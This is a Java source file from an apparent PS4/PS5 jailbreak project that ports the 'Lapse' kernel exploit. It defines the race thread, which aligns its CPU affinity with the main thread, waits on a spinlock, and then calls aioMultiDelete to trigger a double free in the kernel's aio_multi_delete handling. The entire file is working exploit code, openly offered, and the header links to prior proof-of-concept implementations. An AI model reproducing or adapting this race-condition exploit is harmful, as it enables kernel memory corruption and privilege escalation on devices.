// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2025 anonymous - Lapse
// Copyright (C) 2025 Kimari - Java port

package org.bdj.payload;

import org.bdj.UITextConsole;
import org.bdj.api.Buffer;
import org.bdj.payload.LibKernel.AioErrorArray;
import org.bdj.payload.LibKernel.AioSubmitIdArray;
import org.bdj.payload.LibKernel.FileDescriptor;

/* Lapse is a kernel exploit for PS4 [5.00, 12.50) and PS5 [1.00-10.20) disclosed by an anonymous
 * developer ("abc") in 2025. Credit goes to abc for the proof-of-concept, Al-Azif for lapse.mjs,
 * and shahrilnet and znull_ptr for lapse.lua. BlueLapse primarily references the latter.
 *
 * https://www.psdevwiki.com/ps4/Vulnerabilities#FW_5.00-12.02_-_Double_free_due_to_aio_multi_delete()_improper_locking
 * https://github.com/shahrilnet/remote_lua_loader/blob/main/payloads/lapse.lua
 * https://github.com/Al-Azif/psfree-lapse/blob/main/src/lapse.mjs
 *
 * Any code in BlueLapse based on work from lapse.lua or lapse.mjs is available under the GNU Affero
 * General Public License. See the LICENSE file in the repository root for details.
 */

public class LapseRaceThread extends Thread {
	public final LapseMainThread mt;
	public final LibKernel k;
	public final UITextConsole console;

	public Buffer outThreadId;
	public Buffer outDone;
	public FileDescriptor signalFd;
	public AioSubmitIdArray submitIdsToDelete;
	public AioErrorArray errors;

	public LapseRaceThread(LapseMainThread mt, Buffer outThreadId, Buffer outDone,
		FileDescriptor signalFd, AioSubmitIdArray submitIdsToDelete, AioErrorArray errors)
	{
		this.mt = mt;
		k = mt.k;
		console = mt.console;
		this.outThreadId = outThreadId;
		this.outDone = outDone;
		this.signalFd = signalFd;
		this.submitIdsToDelete = submitIdsToDelete;
		this.errors = errors;
	}

	public void run() {
		try {
			real();
		} catch (Throwable e) {
			console.add(e);
		}
	}

	public void real() {
		// Set worker thread affinity (and priority?) to be the same as main thread so
		// they will use similar per-cpu freelist bucket
		k.cpuSetAffinityForCurrentThread(mt.newAffinity);
		// FIXME: Skipping priority until I figure out the problem
		// k.cpuSetPriorityForCurrentThread(mt.newPriority);

		// Mark thread as ready & send back thread id
		// console.add("Racer: signalling, tid = " + k.cpuGetCurrentThreadId());
		outThreadId.putLong(0, k.cpuGetCurrentThreadId());

		// Block until the main thread sends us something on signalFd
		// console.add("Racer: reading from signalFd " + signalFd.fd);
		// signalFd.read(1);

		// Pipes appear to be cursed. Let's see if a spinlock fares any better.
		while (outThreadId.getLong(0) != 0) {
			k.yield();
		}

		// Delete (hopefully double-free!)
		// console.add("Racer: unblocked, calling aioMultiDelete");
		k.aioMultiDelete(submitIdsToDelete, errors);

		// Let the main thread know we're done
		// console.add("Racer: done, signalling main thread");
		outDone.putLong(0, 1);
	}
}
